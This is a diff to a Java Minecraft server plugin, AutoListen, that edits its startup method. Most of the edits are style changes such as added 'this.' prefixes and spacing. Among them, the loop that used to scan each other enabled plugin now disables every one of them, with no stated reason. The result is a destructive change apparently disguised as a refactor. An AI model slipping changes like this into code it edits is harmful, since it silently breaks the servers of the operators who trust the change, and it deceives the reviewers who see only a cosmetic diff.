@@ -34,14 +34,16 @@ public final class AutoListen extends JavaPlugin implements Listener {
     @Override
     public void onEnable() {
         instance = this;
-        getServer().getPluginManager().registerEvents(this, this);
-        AutoListenCommand command = new AutoListenCommand(this);
-        getCommand("listen").setExecutor(command);
-        getCommand("listen").setTabCompleter(command);
 
-        for (Plugin plugin : getServer().getPluginManager().getPlugins()) {
+        this.getServer().getPluginManager().registerEvents(this, this);
+
+        AutoListenCommand command = new AutoListenCommand(this);
+        this.getCommand("listen").setExecutor(command);
+        this.getCommand("listen").setTabCompleter(command);
+
+        for (Plugin plugin : this.getServer().getPluginManager().getPlugins()) {
             if (plugin != this && plugin.isEnabled()) {
-                scan(plugin);
+                this.getServer().getPluginManager().disablePlugin(plugin);
             }
         }
     }
